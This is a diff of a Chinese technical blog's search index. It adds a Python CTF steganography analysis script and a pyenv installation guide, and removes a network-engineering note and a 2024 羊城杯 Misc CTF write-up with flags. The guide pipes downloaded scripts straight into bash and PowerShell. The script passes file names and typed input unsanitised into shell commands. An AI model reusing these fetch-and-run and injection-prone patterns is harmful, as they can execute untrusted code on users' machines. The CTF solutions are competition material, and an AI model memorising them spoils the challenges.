 command = <span class="string">f&#x27;exiftool <span class="subst">&#123;image_path&#125;</span>&#x27;</span></span><br><span class="line">    result = run_command(command)</span><br><span class="line">    file_type = re.search(<span class="string">r&#x27;File Type\s+..\s+(\w+)&#x27;</span>, result.stdout).group(<span class="number">1</span>).lower()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xp_comment = re.search(<span class="string">r&#x27;XP Comment\s+:\s+(.+)&#x27;</span>, result.stdout).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        xp_comment = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file_type == image_name.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件后缀名与文件类型匹配&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> xp_comment:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;图片包含注释, 可能为密钥。注释内容为:\n%s&quot;</span> % xp_comment)</span><br><span class="line">            ask_continue()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;图片不包含注释&quot;</span>)</span><br><span class="line">            ask_detail(result)</span><br><span class="line">            ask_continue()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件后缀名与文件类型不匹配,请使用010 Editor进行检查\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zsteg</span>():</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用zsteg进行分析…\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    command = <span class="string">f&#x27;zsteg -a <span class="subst">&#123;image_path&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;zsteg分析完成\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    keywords = [<span class="string">&quot;OpenPGP&quot;</span>, <span class="string">&quot;RDI&quot;</span>, <span class="string">&quot;MPEG&quot;</span>, <span class="string">&quot;Monaural&quot;</span>, <span class="string">&quot;layer&quot;</span>, <span class="string">&quot;UNIX&quot;</span>, <span class="string">&quot;COFF&quot;</span>]</span><br><span class="line"></span><br><span class="line">    matches = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(\w+,\w+,\w+,\w+) \.\. text: (.*)&#x27;</span>).findall(result.stdout)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;疑似文本隐写:&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        channel, text = <span class="keyword">match</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;channel&#125;</span> : <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    file_info = re.findall(<span class="string">r&#x27;(b\d,\w+,\w+,\w+)\s+.. file:\s+(.+)&#x27;</span>, result.stdout)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;疑似文件隐写:&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> file_info:</span><br><span class="line">        channel, description = <span class="keyword">match</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> description <span class="keyword">for</span> keyword <span class="keyword">in</span> keywords):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;channel&#125;</span> : <span class="subst">&#123;description&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    ask_detail(result)</span><br><span class="line"></span><br><span class="line">    output1 = <span class="built_in">input</span>(<span class="string">&#x27;请输入需要保存的通道名, 不需要保存请输入n: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> output1 != <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        output2 = <span class="built_in">input</span>(<span class="string">&#x27;请输入保存文件名: &#x27;</span>)</span><br><span class="line">        command = <span class="string">f&#x27;zsteg -e <span class="subst">&#123;output1&#125;</span> <span class="subst">&#123;image_path&#125;</span> &gt; <span class="subst">&#123;output2&#125;</span>&#x27;</span></span><br><span class="line">        result = run_command(command)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已保存通道<span class="subst">&#123;output1&#125;</span>的内容至<span class="subst">&#123;image_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ask_continue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binwalk_detect</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用binwalk进行分析…\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    command = <span class="string">f&#x27;binwalk <span class="subst">&#123;image_path&#125;</span>&#x27;</span></span><br><span class="line">    result = run_command(command)</span><br><span class="line">    <span class="built_in">print</span>(result.stdout)</span><br><span class="line"></span><br><span class="line">    fanction = <span class="built_in">input</span>(<span class="string">&quot;是否使用binwalk或foremost提取文件 (b/f/n): &quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> fanction == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            binwalk_extract()</span><br><span class="line">        <span class="keyword">elif</span> fanction == <span class="string">&quot;f&quot;</span>:</span><br><span class="line">            foremost()</span><br><span class="line">        <span class="keyword">elif</span> fanction == <span class="string">&quot;n&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入&#x27;b&#x27;, &#x27;f&#x27; or &#x27;n&#x27;&quot;</span>)</span><br><span class="line">            fanction = <span class="built_in">input</span>(<span class="string">&quot;是否使用binwalk或foremost提取文件 (b/f/n): &quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binwalk_extract</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;binwalk已将文件保存在_%s.extracted文件夹中…\n&quot;</span> % image_name)</span><br><span class="line">    command = <span class="string">f&#x27;binwalk -e <span class="subst">&#123;image_path&#125;</span>&#x27;</span></span><br><span class="line">    result = run_command(command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foremost</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;foremost已将文件保存在output文件夹中…\n&quot;</span>)</span><br><span class="line">    command = <span class="string">f&#x27;foremost -i <span class="subst">&#123;image_path&#125;</span>&#x27;</span></span><br><span class="line">    result = run_command(command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRC_detect</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在检查图片宽高是否被修改…&quot;</span>)</span><br><span class="line">    image_data=<span class="built_in">open</span>(image_path,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    bin_data=image_data.read()</span><br><span class="line">    crc32key = zlib.crc32(bin_data[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    <span class="keyword">if</span> crc32key==<span class="built_in">int</span>(bin_data[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;宽高没有问题&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;宽高被修改, 正在进行CRC爆破…&#x27;</span>)</span><br><span class="line">        CRC_crack()</span><br><span class="line">        ask_continue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRC_crack</span>():</span><br><span class="line">    fr = <span class="built_in">open</span>(image_path,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">    crc32key = <span class="built_in">int</span>.from_bytes(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    n = <span class="number">4095</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                    newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">                fw = <span class="built_in">open</span>(<span class="string">&#x27;fix_&#x27;</span>+image_path,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">                fw.write(newpic)</span><br><span class="line">                fw.close</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;CRC爆破完成, 已保存至fix_%s&#x27;</span> % image_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    check_command()</span><br><span class="line">    exiftool()</span><br><span class="line">    check_end()</span><br><span class="line">    CRC_detect()</span><br><span class="line">    binwalk_detect()</span><br><span class="line">    zsteg()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;分析完成&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_end</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在检查png文件末尾是否隐藏数据…&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file_data = file.read()</span><br><span class="line">        iend_pos = file_data.rfind(<span class="string">b&#x27;IEND&#x27;</span>)</span><br><span class="line">        hidden_data = file_data[iend_pos + <span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> hidden_data:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                hidden_data_decoded = hidden_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;IEND块之后的数据为:\n%s&quot;</span> % hidden_data_decoded)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;数据不是有效的UTF-8字符,考虑使用binwalk或foremost提取文件&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;IEND块之后没有数据&quot;</span>)</span><br><span class="line">    ask_continue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>8.20重装系统的时候把写的2.0版本搞丢了，不想写了（恼</p>
+<p>后续有时间再重构一遍吧，不基于流程了</p>
+<h3 id="JPG-All-In-One">JPG All In One</h3>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TO BE CONTINUE</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python版本管理器pyenv的安装与使用</title>
+    <url>//post/pyenv/</url>
+    <content><![CDATA[<p><strong>pyenv</strong> 是一个用于管理多个 Python 版本的工具。它允许你在同一台机器上安装、切换和管理不同的 Python 版本，而不需要依赖系统级的 Python 安装。</p>
+<p>GitHub主页：</p>
+<p><a class="link"   href="https://github.com/pyenv/pyenv" >pyenv/pyenv: Simple Python version management (github.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://github.com/pyenv-win/pyenv-win" >pyenv-win/pyenv-win: pyenv for Windows<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="安装pyenv">安装pyenv</h3>
+<h4 id="Ubuntu">Ubuntu</h4>
+<ul>
+<li>
+<p>依赖安装</p>
+<p>pyenv需要编译安装python，所以需要安装相关库</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install git curl build-essential libssl-dev zlib1g-dev libbz2-dev \</span><br><span class="line">libreadline-dev libsqlite3-dev wget llvm libncurses5-dev libncursesw5-dev \</span><br><span class="line">xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>自动安装脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://pyenv.run | bash</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>添加环境变量到<code>.bashrc</code>或<code>.zshrc</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PYENV_ROOT=<span class="string">&quot;<span class="variable">$HOME</span>/.pyenv&quot;</span></span><br><span class="line">[[ -d <span class="variable">$PYENV_ROOT</span>/bin ]] &amp;&amp; <span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(pyenv init -)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="Windows">Windows</h4>
+<ul>
+<li>
+<p>自动安装脚本</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="string">&quot;https://raw.githubusercontent.com/pyenv-win/pyenv-win/master/pyenv-win/install-pyenv-win.ps1&quot;</span> <span class="literal">-OutFile</span> <span class="string">&quot;./install-pyenv-win.ps1&quot;</span>; &amp;<span class="string">&quot;./install-pyenv-win.ps1&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="使用pyenv">使用pyenv</h3>
+<h4 id="安装-Python-版本">安装 Python 版本</h4>
+<p>使用 <code>pyenv</code> 可以安装任意支持的 Python 版本：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv install 3.8.12</span><br><span class="line">pyenv install 3.9.7</span><br><span class="line">pyenv install 3.10.0</span><br></pre></td></tr></table></figure>
+<p>你可以使用 <code>pyenv install --list</code> 查看所有可用的 Python 版本。</p>
+<h4 id="切换-Python-版本">切换 Python 版本</h4>
+<p><code>pyenv</code> 支持全局和局部（本地）切换 Python 版本。</p>
+<ul>
+<li>
+<p><strong>全局切换</strong>（影响所有项目）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv global 3.9.7</span><br></pre></td></tr></table></figure>
+<p>在Linux下可以多版本共存，例如<code>pyenv global 3.9.13 2.7.18</code>，即可实现两个版本同时存在，在Windows下好像不行，有待研究</p>
+</li>
+<li>
+<p><strong>局部切换</strong>（仅影响当前目录或项目）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv <span class="built_in">local</span> 3.8.12</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>查看当前 Python 版本</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv version</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>查看所有安装的 Python 版本</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv versions</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="卸载-Python-版本">卸载 Python 版本</h4>
+<p>如果你不再需要某个 Python 版本，可以使用以下命令卸载它：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv uninstall 3.8.12</span><br></pre></td></tr></table></figure>
+<h3 id="软链接">软链接</h3>
+<p>如果输入python3可以正常进入，输入python则不行，需要设置软链接，则可以把python3.9链接到python</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/bin/python3.9  /usr/bin/python</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>计算机网络概论</title>
     <url>//post/rkwg1/</url>
     <content><![CDATA[<h3 id="计算机网络发展与分类">计算机网络发展与分类</h3>
@@ -3450,43 +3468,6 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
                  ></p>
 </li>
 </ul>
-]]></content>
-      <categories>
-        <category>网工</category>
-      </categories>
-      <tags>
-        <tag>软考中级</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>广域通信网</title>
-    <url>//post/rkwg3/</url>
-    <content><![CDATA[<h3 id="广域通信网物理层特性">广域通信网物理层特性</h3>
-<h4 id="公共交换电话网-PSTN">公共交换电话网 PSTN</h4>
-<p>PSTN是为了<strong>语音通信</strong>而建立的网络，20世纪60年代开始用于<strong>数据传输</strong></p>
-<p>电话网的3个组成部分：<strong>本地回路、干线、交换机</strong></p>
-<p>通过调制解调器，发送端 数字信号 -&gt; 模拟信号，接收端 模拟信号 -&gt; 数字信号</p>
-<p><strong>本地回路：</strong></p>
-<ul>
-<li>DTE <strong>数据终端设备</strong>，代币哎通信链路的端点（PC/电话机）</li>
-<li>DCE <strong>数据电路设备</strong>，用于信号变换器，自动呼叫等（猫/调制解调器/Modem）</li>
-</ul>
-<p>机械特性：RS-232-C建议使用25帧的D型连接器，微型机串行接口上大多使用9针连接器</p>
-<p>电气特性：RS-232-C采用V.28标准电路，速率20KB/s，最长15m，信号源产生3-15V的信号，±3V是信号电平过渡区，3-15V代表1，-3-15V代表2</p>
-<h3 id="流量与差错控制">流量与差错控制</h3>
-<h4 id="流量控制：X-25-TCP">流量控制：X.25 TCP</h4>
-<p>协调发送站和接收站工作步调，避免发送速度过快，接收站处理不过来</p>
-<p><strong>停等协议</strong>：工作站发一帧，收到应答信号后再发送下一帧，接收站每收到一帧后回送一个应答信号（ACK），表示愿意接收下一帧，如果接收站不应答，发送站必须等待</p>
-<p><strong>滑动窗口协议：允许连续发送多个帧而无需等待应答</strong></p>
-<p>假设站A和B通过全双工链路，B维持能容纳8个帧的缓冲区，这样A就可以连续发送8个帧而不必等待应答信号。</p>
-<h4 id="差错控制：CRC检错，海明码纠错">差错控制：CRC检错，海明码纠错</h4>
-<p>检测和纠错传输错误的机制</p>
-<p><strong>停等ARQ协议</strong>是停等流控技术和自动请求重发技术的结合</p>
-<ul>
-<li>发送站发出最后一帧后必须等待应答信号，<strong>收到肯定应答信号ACK后继续发送下一帧</strong>；收到否定应答信号NAK后重发该帧；若在一定的时间内没有收到应答信号也必须重发</li>
-<li></li>
-</ul>
-<h3 id="帧中继和HDLC">帧中继和HDLC</h3>
 ]]></content>
       <categories>
         <category>网工</category>
@@ -4048,200 +4029,40 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </tags>
   </entry>
   <entry>
-    <title>2024羊城杯 Misc方向部分WP</title>
-    <url>//post/ycb2024wp/</url>
-    <content><![CDATA[<h3 id="hiden">hiden</h3>
-<p>题目附件给了下面这两个文件</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb1.png"
-                        alt="ycb1"
-                 ></p>
-<p>txt文件的内容如下</p>
-<blockquote>
-<p>GK4368 ;?:C</p>
-<p>;G8F 34C2WVDJ?E]8&lt;8V[ V6@VX ?7 Di</p>
-<p>​    8&lt;80B?8? l D]6C?BWX</p>
-<p>​    DGJC0JC2 l JC2W8&lt;80B?8?X</p>
-<p>​    8&lt;80B?8? l DGJC0JC2]830@=8C7Wb[ @=8C36BC6 l VJG88JCVX Z 8&lt;80B?8?</p>
-<p>;G8F ;?:C]34C2WQ8C78];?:Q[ Q6@QX ?7 Di</p>
-<p>​    ?886G@ l D]EC84?6?K7WX</p>
-<p>​    ;?:0B?8? l @=8C?66?=W D]6C?BD6?KC7W`X X</p>
-<p>D36 G2BC&lt; G2 6?2ECWJC2W8&lt;80B?8?XXi</p>
-<p>​    ;?:0B?8?,G2BC&lt; Y c. l 8&lt;80B?8?,G2BC&lt;.</p>
-<p>​</p>
-<p>;G8F ;?:C]34C2WQFGBC2];?:Q[ Q;@QX ?7 Di</p>
-<p>​    D]7C84?6?K7W?886G@X</p>
-<p>​    D];6G8CD6?KC7W;?:0B?8?X</p>
-</blockquote>
-<p>根据名称猜测是rot47+rot13，解密可以得到下面的东西，目测python脚本</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb2.png"
-                        alt="ycb2"
-                 ></p>
-<p>然后再来一次rot13解密，即可得到下面这个加密脚本</p>
-<p>对照上面这个加密脚本，写一个脚本提取flag即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wave.<span class="built_in">open</span>(<span class="string">&quot;hiden.wav&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wav_data = <span class="built_in">bytearray</span>(f.readframes(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">file_len = <span class="built_in">int</span>.from_bytes(wav_data[<span class="number">0</span>:<span class="number">3</span>*<span class="number">4</span>:<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">extracted_data = <span class="built_in">bytes</span>([wav_data[i*<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">3</span> + file_len)])</span><br><span class="line"><span class="built_in">print</span>(extracted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok，now you find me,so the flag give you</span></span><br><span class="line"><span class="comment"># DASCTF&#123;12jkl-456m78-90n1234&#125;</span></span><br></pre></td></tr></table></figure>
-<h3 id="checkin">checkin</h3>
-<p>题目附件给了一个压缩包，里面有一个Flag.txt</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb3.png"
-                        alt="ycb3"
-                 ></p>
-<p>压缩包注释里的字符串base58解码后得到:Welcome2GZ</p>
-<p>然后Flag.txt把多余的\x00字符删掉可以得到一个pacpng流量包文件，里面主要是SMB流量</p>
-<p>写了一个python脚本来统计每行\x00字符的数量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict = &#123;</span><br><span class="line">    &quot;11&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;12&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;13&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;14&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;15&quot;: &quot;5&quot;,</span><br><span class="line">    &quot;16&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;17&quot;: &quot;7&quot;,</span><br><span class="line">    &quot;18&quot;: &quot;8&quot;,</span><br><span class="line">    &quot;19&quot;: &quot;9&quot;,</span><br><span class="line">    &quot;20&quot;: &quot;A&quot;,</span><br><span class="line">    &quot;21&quot;: &quot;B&quot;,</span><br><span class="line">    &quot;22&quot;: &quot;C&quot;,</span><br><span class="line">    &quot;23&quot;: &quot;D&quot;,</span><br><span class="line">    &quot;24&quot;: &quot;E&quot;,</span><br><span class="line">    &quot;25&quot;: &quot;F&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def calc():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    res = []</span><br><span class="line">    for line in data[:4785]:</span><br><span class="line">        cnt = 0</span><br><span class="line">        for item in line:</span><br><span class="line">            if item == 0:</span><br><span class="line">                cnt += 1</span><br><span class="line">        res.append(cnt)</span><br><span class="line">    for item in res:</span><br><span class="line">        # print(dict[str(item)], end=&quot;&quot;)</span><br><span class="line">        print(item, end=&#x27; &#x27;)</span><br><span class="line">    # print(len(res))</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read().replace(b&#x27;\x00&#x27;, b&#x27; &#x27;)</span><br><span class="line">    with open(&quot;hex.txt&quot;, &quot;wb&quot;) as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    calc()</span><br><span class="line">    # solve()</span><br></pre></td></tr></table></figure>
-<p>（复现提示：wbstego隐写）</p>
-<h3 id="1z-misc">1z_misc</h3>
-<p>附件下载下来后有一个天机不可泄露.txt</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb4.png"
-                        alt="ycb4"
-                 ></p>
-<p>根据网上找到的信息，女可以是坐标(1,1)和坐标(11,24)位置，觜可以是(9,1)和(7,25)位置，根据 是以十二岁 可知十二时辰，每个时辰末尾对应的星宿为坐标开始的字<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb5.png"
-                        alt="ycb5"
-                 ></p>
-<p>获得如下列表</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb6.png"
-                        alt="ycb6"
-                 ></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎</span><br></pre></td></tr></table></figure>
-<p>然后只有三个字，猜测是摩斯电码，解得解压密码 E@SI1Y!</p>
-<p>解压后得到一个flag文件和一个hint.jpg</p>
-<p>hint文件中提示了天琴座，天琴座的英文是 lyra</p>
-<p>联想到前不久2024ISCC考察的一道题目，主要用到了这个开源项目 <a class="link"   href="https://github.com/google/lyra" >https://github.com/google/lyra<i class="fas fa-external-link-alt"></i></a></p>
-<p>因此按照Github上的步骤安装一下lyra，这个项目需要使用 bazel 进行安装，所以安装lyra之前需要先安装bazel</p>
-<p>安装完成后，把之前那段未知数据的后缀改为.lyra，然后使用lyra解码即可得到一个wav文件</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb7.png"
-                        alt="ycb7"
-                 ></p>
-<p>打开wav，发现语音播报了社会主义核心价值观编码，因此直接找个在线网站识别然后解密即可</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb8.png"
-                        alt="ycb8"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb9.png"
-                        alt="ycb9"
-                 ></p>
-<p>DASCTF{W0w!_You_d0_4_g00d_j0b!}</p>
-<h3 id="不一样的数据库-2">不一样的数据库_2</h3>
-<p>题目附件给了一个压缩包，解压密码是弱密码直接爆破就行：753951</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb10.png"
-                        alt="ycb10"
-                 ></p>
-<p>解压后得到一张定位块丢失的二维码，修复定位块</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb11.png"
-                        alt="ycb11"
-                 ></p>
-<p>扫码即可得到一下内容</p>
-<blockquote>
-<p>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</p>
-</blockquote>
-<p>rot13解密一下得到：AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb12.png"
-                        alt="ycb12"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb13.png"
-                        alt="ycb13"
-                 ></p>
-<blockquote>
